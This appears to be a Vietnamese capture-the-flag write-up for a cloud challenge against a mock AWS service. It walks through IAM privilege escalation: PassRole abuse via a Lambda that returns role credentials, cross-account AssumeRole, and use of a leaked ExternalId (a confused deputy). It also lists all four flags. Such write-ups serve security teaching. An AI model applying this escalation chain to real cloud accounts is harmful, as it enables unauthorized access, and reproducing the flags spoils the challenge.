# Deputy — Cloud (Hard)

Sứ mệnh này gồm 4 cờ ẩn giấu theo cấp độ thâm nhập (objective):

```text
recon       H7CTF{d6cc592f5a2f3db80718}
passrole    H7CTF{28f87391f8a228110839}
admin       H7CTF{ea3e1dba8012d76e2648}
externalid  H7CTF{1dbe909840d15aabdd63}
```

**Dịch vụ mồi (Instance):** `https://web-d8f0b09a99a6a969.web.h7tex.com` 
**Chìa khoá xuất phát:** `AKIAANALYST0000000000` (thuộc định danh người dùng `analyst`, trên mã tài khoản hệ thống `111111111111`).

## Đề bài

Vở kịch bắt đầu khi một tập đoàn đối tác mang tên DeputyCorp tích hợp hệ thống vào hạ tầng mạng của công ty ta. Đội ngũ an ninh cấp cho ta một chiếc chìa khoá tài khoản mang tên `analyst` với đặc quyền bị bóp nghẹt dưới đáy xã hội. Sứ mệnh của ta là phải đóng vai trò kiểm toán viên, chọc sâu vào lớp vỏ bọc để phơi bày sự cẩu thả (đãng trí) của quá trình tích hợp này, bằng cách lần lượt bóc trần 4 lớp cờ phòng thủ bảo vệ hệ thống.

## Phân tích ban đầu

Môi trường live thực chất là một mô hình giả lập (mock) AWS được chạy bằng bộ khung `Werkzeug/3.1.8`. Chỉ bằng vài chiêu dò sóng (request), ta định hình ngay được 3 bề mặt API chính của cỗ máy giả lập này:

| Bề mặt API | Cách gọi hồn |
| --- | --- |
| Dịch vụ phân quyền STS + IAM | Đẩy `POST /` nhồi kèm form thân `Action=...&Version=...` (hệ thống sẽ điều phối tuỳ theo `Action`). |
| Dịch vụ lưu trữ S3 | Gọi `GET /<bucket>` và `GET /<bucket>/<key>` (Sử dụng chuẩn path-style; đoạn url đầu tiên bị ép hiểu là tên của bucket, lỗi nôn ra `NoSuchBucket: <đoạn_tên>`). |
| Hàm không máy chủ (Lambda) | REST API nguyên thủy: `GET|POST /2015-03-31/functions`, `POST /2015-03-31/functions/<name>/invocations`. |

Cái gai nhức nhối nhưng cũng là điểm huyệt chí mạng nhất: Cỗ máy giả lập (mock) này **mù lòa trong việc kiểm duyệt chữ ký (signature)**. Chỉ cần nhét header `Authorization: AWS4-HMAC-SHA256 Credential=AKIA.../us-east-1/iam/aws4_request, Signature=x` là đủ lừa nó. Máy chủ chỉ thò tay bốc ID của khóa (access key id) từ mâm header, và rút token phiên làm việc (session token) qua ngõ `X-Amz-Security-Token`, rồi hồn nhiên gán chính sách nội tuyến (inline policy) của danh tính đó vào phiên giao dịch. Host không cài thư viện chuẩn `boto3`? Chẳng thành vấn đề: với tay tự viết ngay một bộ máy client dài 40 dòng mã (`analysis/awsclient.py`).

Việc moi móc đọc được các văn bản chính sách (policy) chính là chìa khóa mở tung thế trận của toàn bộ bài toán. Hai lệnh `ListPolicies`/`GetPolicyVersion` nôn về một dải rỗng tuếch, do mock bảo thủ chỉ thèm nhét loại chính sách nội tuyến (inline policy):

```text
iam:ListUserPolicies(analyst)     -> Nhả mảng ["analyst-permissions"]
iam:GetUserPolicy                 -> Nhả tài liệu policy dễ dàng giải mã được
iam:ListRolePolicies(ci-runner)   -> Nhả mảng ["ci-runner-permissions"]
```

Hai tài liệu trên phơi bày trần trụi toan tính của hệ thống (phiên bản không che nằm trong tài liệu `de.md`): Tài khoản gẻ `analyst` lại được cầm đặc quyền `iam:PassRole` hướng mục tiêu trực tiếp tới vai trò `ci-runner-role`, lại còn gánh thêm quyền tạo và kích nổ hàm (`lambda:CreateFunction|InvokeFunction`). Về phần `ci-runner-role`, nó đút túi khả năng nhập vai (`sts:AssumeRole`) để nhảy thẳng sang `arn:aws:iam::999999999999:role/partner-admin-role`. Lớp tường rào (trust policy) bảo vệ runner bị đục thủng, do nó cho phép các dịch vụ `lambda.amazonaws.com` tuỳ ý đội lốt nó.

## Chuỗi khai thác

### Giai đoạn 1 - Trinh sát (recon)

Lệnh `s3:ListAllMyBuckets` (chạy `GET /`) khai quật ra 4 cái thùng rác (bucket): `deputy-analyst-scratch`, `deputy-runner-logs`, `deputy-flag-vault`, và `deputy-crown-vault`. Khổ nỗi, `analyst` chỉ có chìa khóa mở cái thùng đầu tiên:

```text
GET /deputy-analyst-scratch        -> Phơi bày mồi <Key>welcome.txt</Key>
GET /deputy-analyst-scratch/welcome.txt
  Welcome, analyst.
  H7CTF{d6cc592f5a2f3db80718}
  Onboarding: our deploys run through a Lambda that executes as ci-runner-role.
```
Bức thư chào mừng khai vị một lá cờ, kèm luôn lời mồi chài cho con mồi tiếp theo (mọi bản vá đều chạy qua một chức năng Lambda mượn hồn `ci-runner-role`).

### Giai đoạn 2 - Ép áo đổi hồn (PassRole) vào Lambda 
*(Kỹ thuật kinh điển: "Mượn áo người khác mặc cho tay sai")*

Gã lính quèn Analyst không có cửa trực tiếp kích hoạt `sts:AssumeRole` để đội lốt runner (vì trust policy chỉ dành riêng cho service của Lambda), nhưng gã lại có đặc quyền `iam:PassRole` trỏ thẳng vào chính xác cái mã số (ARN) đó. Chiến thuật rất rõ ràng: Đẻ ra một hàm chức năng (Function), bận chiếc áo role đó vào cho nó, rồi kích hỏa:

```http
POST /2015-03-31/functions
  {"FunctionName":"deputy-relay","Role":"arn:aws:iam::111111111111:role/ci-runner-role",
   "Runtime":"python3.11","Handler":"lambda_function.lambda_handler","Code":{"ZipFile":"..."}}
-> Kết quả: 201 Created

POST /2015-03-31/functions/deputy-relay/invocations
-> Kết quả: 200 {"message":"function executed; the execution role's environment credentials follow",
        "AWS_ACCESS_KEY_ID":"ASIA...","AWS_SECRET_ACCESS_KEY":"...","AWS_SESSION_TOKEN":"..."}
```

Rà soát quyền năng (bằng `GetCallerIdentity`) trên bộ khoá mới trấn lột, kết quả xưng danh là `arn:aws:sts::111111111111:assumed-role/ci-runner-role/awslambda-deputy-relay`. Lợi dụng vỏ bọc hoàn hảo này:

```text
GET /deputy-runner-logs/build.log -> H7CTF{28f87391f8a228110839}
```

### Giai đoạn 3 - Vượt ngục sang lãnh thổ của Partner (AssumeRole)

Lệnh lệnh (Policy) của runner gật đầu cho phép, và chiếc rương `partner-admin-role` thì hồn nhiên hớ hênh không đòi hỏi thêm bất cứ thủ tục điều kiện quái quỷ nào:

```text
Action=AssumeRole RoleArn=arn:aws:iam::999999999999:role/partner-admin-role
  RoleSessionName=deputy-step (Ràng buộc duy nhất là tên phiên phải >= 2 ký tự, nếu vi phạm, mock sẽ đá ra ValidationError).
-> Vét được: ASIA... / tok/...  (Chính thức đặt chân lên vùng lãnh thổ mã 999999999999)
```

Sức mạnh của Admin phá nát rào chắn của cái kho `deputy-flag-vault` (thứ mà cả analyst và runner đều đứng nhìn thèm khát):

```text
GET /deputy-flag-vault        -> Hiển thị 2 vật phẩm: flag, partner-config.json
s3://deputy-flag-vault/flag                 -> Nôn cờ: H7CTF{ea3e1dba8012d76e2648}
s3://deputy-flag-vault/partner-config.json  -> Phun bí mật: {"secure_role":"arn:aws:iam::999999999999:role/partner-secure-role",
                                                 "external_id":"Dc-2026-8f31a97c4b2e"}
```

### Giai đoạn 4 - Thao túng uỷ quyền lú lẫn (Confused-Deputy)

Trùm cuối `deputy-crown-vault` kiên cường báo lỗi 403 ngay cả trước mũi của gã partner-admin. Chiếc áo `partner-secure-role` đã được tôi luyện (hardened) vô cùng cẩn thận: trust policy kiên quyết bắt buộc phải xuất trình thẻ `sts:ExternalId`. Bộ khung Mock AWS phân xử rạch ròi từng hạt bụi:

```text
AssumeRole partner-secure-role                          -> Bật 403: The trust policy requires an sts:ExternalId but none was provided.
AssumeRole ... ExternalId=wrong_cố_tình_nhập_sai       -> Bật 403: The trust policy requires a matching sts:ExternalId.
AssumeRole ... ExternalId=Dc-2026-8f31a97c4b2e          -> Nuốt ngon 200: assumed-role/partner-secure-role/crown-step
```

Vác chuỗi creds quyền lực nhất chọc ngoáy: `GET /deputy-crown-vault/flag` -> Lấy cờ: `H7CTF{1dbe909840d15aabdd63}`.

### Bản đồ leo thang chiến lược

```text
Người chơi xuất phát (user/analyst)
  ├─ s3:GetObject(scratch)                -> Đút túi cờ số 1 (recon)
  ├─ iam:PassRole(ci-runner) đi kèm lambda:CreateFunction/Invoke
  │     -> Trụy lốt thành ci-runner-role  -> Đút túi cờ số 2 (passrole)
  │        -> Khởi động sts:AssumeRole đâm thẳng vào partner-admin-role (acct 999999999999)
  │                                        -> Đút túi cờ số 3 (admin)
  │           -> Móc s3:GetObject(flag-vault) bốc được mã sinh mệnh external_id
  │              -> Tung đòn sts:AssumeRole đội lốt partner-secure-role (Kẹp ExternalId=...)
  │                                        -> Đút túi cờ số 4 (externalid)
```

## Kết Quả
```bash
$ python solve_deputy.py
[+] STAGE 1 recon: H7CTF{d6cc592f5a2f3db80718}
[+] STAGE 2 passrole: H7CTF{28f87391f8a228110839}
[+] STAGE 3 admin: H7CTF{ea3e1dba8012d76e2648}
[+] STAGE 4 externalid: H7CTF{1dbe909840d15aabdd63}
```

Kiểm toán tự động: Chạy lặp `python solve_deputy.py` (cần bắt cặp kẹp nách tệp `analysis/awsclient.py`; ghi toàn bộ chiến lợi phẩm ra `flags.txt`). Ngay cả khi lặp cuộc càn quét lần thứ 2 trên cùng một vùng chiến sự (instance), tuy sẽ bị sặc mã `409` ở thao tác CreateFunction do con hàng (hàm Lambda) đã tồn tại từ trước, lệnh invoke vẫn sẽ lì lợm vắt kiệt nó lại, đảm bảo chuỗi tấn công không bao giờ đứt đoạn.
